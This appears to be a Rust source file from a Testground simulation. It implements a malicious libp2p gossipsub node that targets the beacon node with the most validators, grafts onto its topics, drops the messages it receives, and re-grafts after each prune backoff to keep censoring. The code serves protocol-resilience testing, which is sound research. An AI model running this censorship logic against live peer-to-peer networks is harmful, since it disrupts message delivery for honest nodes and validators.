use crate::beacon_node::BeaconNodeInfo;
use crate::beacon_node::PRUNE_BACKOFF;
use crate::utils::{
    record_topology_attacker, record_topology_edge, record_victim_id, BARRIER_SIMULATION_COMPLETED,
};
use crate::{BARRIER_LIBP2P_READY, BARRIER_TOPOLOGY_READY};
use delay_map::HashSetDelay;
use libp2p_testground::core::connection::ConnectionId;
use libp2p_testground::core::muxing::StreamMuxerBox;
use libp2p_testground::core::upgrade::{SelectUpgrade, Version};
use libp2p_testground::dns::TokioDnsConfig;
use libp2p_testground::futures::stream::FusedStream;
use libp2p_testground::futures::{FutureExt, Stream, StreamExt};
use libp2p_testground::gossipsub::error::PublishError;
use libp2p_testground::gossipsub::handler::{GossipsubHandler, GossipsubHandlerIn, HandlerEvent};
use libp2p_testground::gossipsub::protocol::ProtocolConfig;
use libp2p_testground::gossipsub::types::{
    GossipsubControlAction, GossipsubSubscription, GossipsubSubscriptionAction, PeerInfo,
};
use libp2p_testground::gossipsub::{
    rpc_proto, GossipsubConfig, GossipsubConfigBuilder, GossipsubEvent, GossipsubRpc, TopicHash,
    ValidationMode,
};
use libp2p_testground::identity::Keypair;
use libp2p_testground::mplex::MplexConfig;
use libp2p_testground::multiaddr::Protocol;
use libp2p_testground::noise::{NoiseConfig, X25519Spec};
use libp2p_testground::swarm::{
    ConnectionHandler, IntoConnectionHandler, NetworkBehaviour, NetworkBehaviourAction,
    NotifyHandler, PollParameters, SwarmBuilder, SwarmEvent,
};
use libp2p_testground::tcp::tokio::Transport as TcpTransport;
use libp2p_testground::tcp::Config as TcpConfig;
use libp2p_testground::yamux::YamuxConfig;
use libp2p_testground::{Multiaddr, Transport};
use libp2p_testground::{PeerId, Swarm};
use prost::Message;
use std::borrow::Cow;
use std::collections::{HashMap, VecDeque};
use std::fmt::Debug;
use std::task::{Context, Poll};
use std::time::Duration;
use testground::client::Client;
use tracing::{debug, error, info};

// In this `attacker` module, we use `libp2p_testground` instead of `libp2p`.
// `libp2p_testground` is a fork of `libp2p`, some its module (e.g. `handler`) made public to
// implement `MaliciousBehaviour`.
// See https://github.com/ackintosh/rust-libp2p/pull/45 for changes made in `libp2p_testground`.

/// A delay before sending GRAFT after being pruned.
const PRUNE_BACKOFF_DELAY: u64 = 5;

pub(crate) async fn run(client: Client) -> Result<(), Box<dyn std::error::Error>> {
    // ////////////////////////////////////////////////////////////////////////
    // Start libp2p
    // ////////////////////////////////////////////////////////////////////////
    let keypair = Keypair::generate_ed25519();
    let peer_id = PeerId::from(keypair.public());
    info!("Attacker: peer_id: {}", peer_id);

    let mut swarm = build_swarm(keypair);
    let multiaddr = {
        let mut multiaddr = Multiaddr::from(
            client
                .run_parameters()
                .data_network_ip()?
                .expect("Should have an IP address for the data network"),
        );
        multiaddr.push(Protocol::Tcp(9000));
        multiaddr
    };

    swarm.listen_on(multiaddr.clone())?;
    match swarm.next().await.unwrap() {
        SwarmEvent::NewListenAddr { address, .. } if address == multiaddr => {}
        e => panic!("Unexpected event {:?}", e),
    }

    let (target_node_id, beacon_nodes) = collect_beacon_node_info(&client).await?;

    client
        .publish("attacker_info", Cow::Owned(serde_json::to_value(peer_id)?))
        .await?;

    record_topology_attacker(&client, &peer_id).await;

    barrier_and_drive_swarm(&client, &mut swarm, BARRIER_LIBP2P_READY).await?;

    // /////////////////////////////////////////////////////////////////////////////////////////////
    // Setup discovery
    // /////////////////////////////////////////////////////////////////////////////////////////////
    let target = beacon_nodes
        .get(&target_node_id)
        .expect("The target_node_id should be in the beacon_nodes.");

    info!("Censoring target : {:?}", target);
    record_victim_id(&client, target).await;
    record_topology_edge(&client, peer_id.to_string(), target.peer_id().to_string()).await;

    swarm.dial(target.multiaddr().clone())?;
    barrier_and_drive_swarm(&client, &mut swarm, BARRIER_TOPOLOGY_READY).await?;

    barrier_and_drive_swarm(&client, &mut swarm, BARRIER_SIMULATION_COMPLETED).await?;

    client.record_success().await?;
    Ok(())
}

fn build_swarm(keypair: Keypair) -> Swarm<MaliciousBehaviour> {
    SwarmBuilder::with_tokio_executor(
        build_transport(&keypair),
        MaliciousBehaviour::new(),
        PeerId::from(keypair.public()),
    )
    .build()
}

fn build_transport(
    keypair: &Keypair,
) -> libp2p_testground::core::transport::Boxed<(PeerId, StreamMuxerBox)> {
    let transport = TokioDnsConfig::system(TcpTransport::new(
        TcpConfig::default().nodelay(true),
    ))
    .expect("DNS config");

    let noise_keys = libp2p_testground::noise::Keypair::<X25519Spec>::new()
        .into_authentic(keypair)
        .expect("Signing libp2p-noise static DH keypair failed.");

    transport
        .upgrade(Version::V1)
        .authenticate(NoiseConfig::xx(noise_keys).into_authenticated())
        .multiplex(SelectUpgrade::new(
            YamuxConfig::default(),
            MplexConfig::default(),
        ))
        .timeout(Duration::from_secs(20))
        .boxed()
}

async fn collect_beacon_node_info(
    client: &Client,
) -> Result<(usize, HashMap<usize, BeaconNodeInfo>), Box<dyn std::error::Error>> {
    let num_beacon_node = (client.run_parameters().test_instance_count
        - client.run_parameters().test_group_instance_count) as usize;

    let mut stream = client
        .subscribe("beacon_node_info", num_beacon_node * 2)
        .await;

    let mut beacon_nodes = HashMap::new();

    let mut num_vals = 0;
    // Censor target node
    let mut target_node_id = 0;

    for _ in 0..num_beacon_node {
        match stream.next().await {
            Some(Ok(value)) => {
                let (node_id, info): (usize, BeaconNodeInfo) = serde_json::from_value(value)?;

                if info.validators().len() > num_vals {
                    num_vals = info.validators().len();
                    target_node_id = node_id;
                }

                beacon_nodes.insert(node_id, info);
            }
            Some(Err(e)) => return Err(Box::new(e)),
            None => unreachable!(),
        }
    }

    Ok((target_node_id, beacon_nodes))
}

/// Sets a barrier on the supplied state that fires when it reaches all participants.
async fn barrier_and_drive_swarm<T: StreamExt + Unpin + FusedStream>(
    client: &Client,
    swarm: &mut T,
    state: impl Into<Cow<'static, str>> + Copy,
) -> Result<(), Box<dyn std::error::Error>>
where
    <T as Stream>::Item: Debug,
{
    info!(
        "Signal and wait for all peers to signal being done with \"{}\".",
        state.into(),
    );
    swarm
        .take_until(
            client
                .signal_and_wait(state, client.run_parameters().test_instance_count)
                .boxed_local(),
        )
        .map(|event| debug!("Event: {:?}", event))
        .collect::<Vec<()>>()
        .await;

    Ok(())
}

type GossipsubNetworkBehaviourAction =
    NetworkBehaviourAction<GossipsubEvent, GossipsubHandler, GossipsubHandlerIn>;

pub struct MaliciousBehaviour {
    /// Configuration providing gossipsub performance parameters.
    config: GossipsubConfig,
    /// Events that need to be yielded to the outside when polling.
    events: VecDeque<GossipsubNetworkBehaviourAction>,
    /// A collection of peers awaiting to be re-grafted.
    regraft: HashSetDelay<(PeerId, TopicHash)>,
}

impl MaliciousBehaviour {
    fn new() -> Self {
        MaliciousBehaviour {
            config: GossipsubConfigBuilder::default()
                .max_transmit_size(10 * 1_048_576) // 10M
                .history_length(12)
                .validation_mode(ValidationMode::Anonymous)
                .build()
                .expect("Valid configuration"),
            events: VecDeque::new(),
            regraft: HashSetDelay::new(Duration::from_secs(PRUNE_BACKOFF + PRUNE_BACKOFF_DELAY)),
        }
    }

    /// Handles received subscriptions.
    fn handle_received_subscriptions(
        &mut self,
        subscriptions: &[GossipsubSubscription],
        propagation_source: &PeerId,
    ) {
        debug!(
            "Received subscriptions from {}. {:?}",
            propagation_source, subscriptions,
        );

        let mut topics_to_graft = Vec::new();
        for subscription in subscriptions {
            match subscription.action {
                GossipsubSubscriptionAction::Subscribe => {
                    topics_to_graft.push(subscription.topic_hash.clone());
                }
                GossipsubSubscriptionAction::Unsubscribe => {}
            }
        }

        if !topics_to_graft.is_empty() {
            debug!(
                "Sending GRAFT to {}. topics: {:?}",
                propagation_source, topics_to_graft
            );

            if let Err(error) = self.send_message(
                *propagation_source,
                GossipsubRpc {
                    subscriptions: Vec::new(),
                    messages: Vec::new(),
                    control_msgs: topics_to_graft
                        .into_iter()
                        .map(|topic_hash| GossipsubControlAction::Graft { topic_hash })
                        .collect(),
                }
                .into_protobuf(),
            ) {
                error!("Failed sending grafts: {}", error);
            }
        }
    }

    /// Handles PRUNE control messages.
    fn handle_prune(
        &mut self,
        peer_id: &PeerId,
        prune_data: Vec<(TopicHash, Vec<PeerInfo>, Option<u64>)>,
    ) {
        debug!("Received PRUNE message from {}.", peer_id);

        for prune in prune_data {
            if let Some(backoff) = prune.2 {
                // If a backoff is specified by the peer obey it.
                self.regraft.insert_at(
                    (*peer_id, prune.0),
                    Duration::from_secs(backoff + PRUNE_BACKOFF_DELAY),
                );
            } else {
                self.regraft.insert((*peer_id, prune.0));
            }
        }
    }

    // /////////////////////////////////////////////////////////////////////////////////////////////
    // The methods from here down is copied from `libp2p::protocols::gossipsub::Gossipsub`.
    // /////////////////////////////////////////////////////////////////////////////////////////////

    /// Send a GossipsubRpc message to a peer. This will wrap the message in an arc if it
    /// is not already an arc.
    fn send_message(
        &mut self,
        peer_id: PeerId,
        message: rpc_proto::Rpc,
    ) -> Result<(), PublishError> {
        // If the message is oversized, try and fragment it. If it cannot be fragmented, log an
        // error and drop the message (all individual messages should be small enough to fit in the
        // max_transmit_size)

        let messages = self.fragment_message(message)?;

        for message in messages {
            self.events
                .push_back(NetworkBehaviourAction::NotifyHandler {
                    peer_id,
                    event: GossipsubHandlerIn::Message(message),
                    handler: NotifyHandler::Any,
                })
        }
        Ok(())
    }

    // If a message is too large to be sent as-is, this attempts to fragment it into smaller RPC
    // messages to be sent.
    fn fragment_message(&self, rpc: rpc_proto::Rpc) -> Result<Vec<rpc_proto::Rpc>, PublishError> {
        if rpc.encoded_len() < self.config.max_transmit_size() {
            return Ok(vec![rpc]);
        }

        let new_rpc = rpc_proto::Rpc {
            subscriptions: Vec::new(),
            publish: Vec::new(),
            control: None,
        };

        let mut rpc_list = vec![new_rpc.clone()];

        // Gets an RPC if the object size will fit, otherwise create a new RPC. The last element
        // will be the RPC to add an object.
        macro_rules! create_or_add_rpc {
            ($object_size: ident ) => {
                let list_index = rpc_list.len() - 1; // the list is never empty

                // create a new RPC if the new object plus 5% of its size (for length prefix
                // buffers) exceeds the max transmit size.
                if rpc_list[list_index].encoded_len() + (($object_size as f64) * 1.05) as usize
                    > self.config.max_transmit_size()
                    && rpc_list[list_index] != new_rpc
                {
                    // create a new rpc and use this as the current
                    rpc_list.push(new_rpc.clone());
                }
            };
        }

        macro_rules! add_item {
            ($object: ident, $type: ident ) => {
                let object_size = $object.encoded_len();

                if object_size + 2 > self.config.max_transmit_size() {
                    // This should not be possible. All received and published messages have already
                    // been vetted to fit within the size.
                    error!("Individual message too large to fragment");
                    return Err(PublishError::MessageTooLarge);
                }

                create_or_add_rpc!(object_size);
                rpc_list
                    .last_mut()
                    .expect("Must have at least one element")
                    .$type
                    .push($object.clone());
            };
        }

        // Add messages until the limit
        for message in &rpc.publish {
            add_item!(message, publish);
        }
        for subscription in &rpc.subscriptions {
            add_item!(subscription, subscriptions);
        }

        // handle the control messages. If all are within the max_transmit_size, send them without
        // fragmenting, otherwise, fragment the control messages
        let empty_control = rpc_proto::ControlMessage::default();
        if let Some(control) = rpc.control.as_ref() {
            if control.encoded_len() + 2 > self.config.max_transmit_size() {
                // fragment the RPC
                for ihave in &control.ihave {
                    let len = ihave.encoded_len();
                    create_or_add_rpc!(len);
                    rpc_list
                        .last_mut()
                        .expect("Always an element")
                        .control
                        .get_or_insert_with(|| empty_control.clone())
                        .ihave
                        .push(ihave.clone());
                }
                for iwant in &control.iwant {
                    let len = iwant.encoded_len();
                    create_or_add_rpc!(len);
                    rpc_list
                        .last_mut()
                        .expect("Always an element")
                        .control
                        .get_or_insert_with(|| empty_control.clone())
                        .iwant
                        .push(iwant.clone());
                }
                for graft in &control.graft {
                    let len = graft.encoded_len();
                    create_or_add_rpc!(len);
                    rpc_list
                        .last_mut()
                        .expect("Always an element")
                        .control
                        .get_or_insert_with(|| empty_control.clone())
                        .graft
                        .push(graft.clone());
                }
                for prune in &control.prune {
                    let len = prune.encoded_len();
                    create_or_add_rpc!(len);
                    rpc_list
                        .last_mut()
                        .expect("Always an element")
                        .control
                        .get_or_insert_with(|| empty_control.clone())
                        .prune
                        .push(prune.clone());
                }
            } else {
                let len = control.encoded_len();
                create_or_add_rpc!(len);
                rpc_list.last_mut().expect("Always an element").control = Some(control.clone());
            }
        }

        Ok(rpc_list)
    }
}

impl NetworkBehaviour for MaliciousBehaviour {
    // Using `GossipsubHandler` which is made public in `libp2p_testground` crate.
    type ConnectionHandler = GossipsubHandler;
    type OutEvent = GossipsubEvent;

    fn new_handler(&mut self) -> Self::ConnectionHandler {
        let protocol_config = ProtocolConfig::new(
            self.config.protocol_id().clone(),
            self.config.custom_id_version().clone(),
            self.config.max_transmit_size(),
            self.config.validation_mode().clone(),
            self.config.support_floodsub(),
        );

        GossipsubHandler::new(protocol_config, self.config.idle_timeout())
    }

    fn inject_event(
        &mut self,
        propagation_source: PeerId,
        _connection: ConnectionId,
        handler_event: <<Self::ConnectionHandler as IntoConnectionHandler>::Handler as ConnectionHandler>::OutEvent,
    ) {
        match handler_event {
            HandlerEvent::Message {
                rpc,
                invalid_messages: _,
            } => {
                // Handle subscriptions
                if !rpc.subscriptions.is_empty() {
                    self.handle_received_subscriptions(&rpc.subscriptions, &propagation_source);
                }

                // Handle control messages
                let mut prune_msgs = vec![];
                for control_msg in rpc.control_msgs {
                    match control_msg {
                        GossipsubControlAction::IHave { .. }
                        | GossipsubControlAction::IWant { .. }
                        | GossipsubControlAction::Graft { .. } => {}
                        GossipsubControlAction::Prune {
                            topic_hash,
                            peers,
                            backoff,
                        } => prune_msgs.push((topic_hash, peers, backoff)),
                    }
                }

                if !prune_msgs.is_empty() {
                    self.handle_prune(&propagation_source, prune_msgs);
                }

                if !rpc.messages.is_empty() {
                    let topics = rpc
                        .messages
                        .iter()
                        .map(|msg| &msg.topic)
                        .collect::<Vec<_>>();
                    debug!(
                        "Censoring messages from {}. topics: {:?}",
                        propagation_source, topics
                    );
                }
            }
            HandlerEvent::PeerKind(_) => {}
        }
    }

    fn poll(
        &mut self,
        cx: &mut Context<'_>,
        _params: &mut impl PollParameters,
    ) -> Poll<NetworkBehaviourAction<Self::OutEvent, Self::ConnectionHandler>> {
        if let Some(event) = self.events.pop_front() {
            return Poll::Ready(event);
        }

        loop {
            match self.regraft.poll_next_unpin(cx) {
                Poll::Ready(Some(Ok((peer_id, topic_hash)))) => {
                    debug!(
                        "Sending GRAFT to {} in the context of regraft. topic_hash: {}",
                        peer_id, topic_hash
                    );

                    if let Err(error) = self.send_message(
                        peer_id,
                        GossipsubRpc {
                            subscriptions: Vec::new(),
                            messages: Vec::new(),
                            control_msgs: vec![GossipsubControlAction::Graft { topic_hash }],
                        }
                        .into_protobuf(),
                    ) {
                        error!("Failed sending grafts: {}", error);
                    }
                }
                Poll::Ready(Some(Err(error))) => {
                    error!("Failed to check for peers to re-GRAFT: {}", error);
                }
                Poll::Ready(None) | Poll::Pending => break,
            }
        }

        Poll::Pending
    }
}
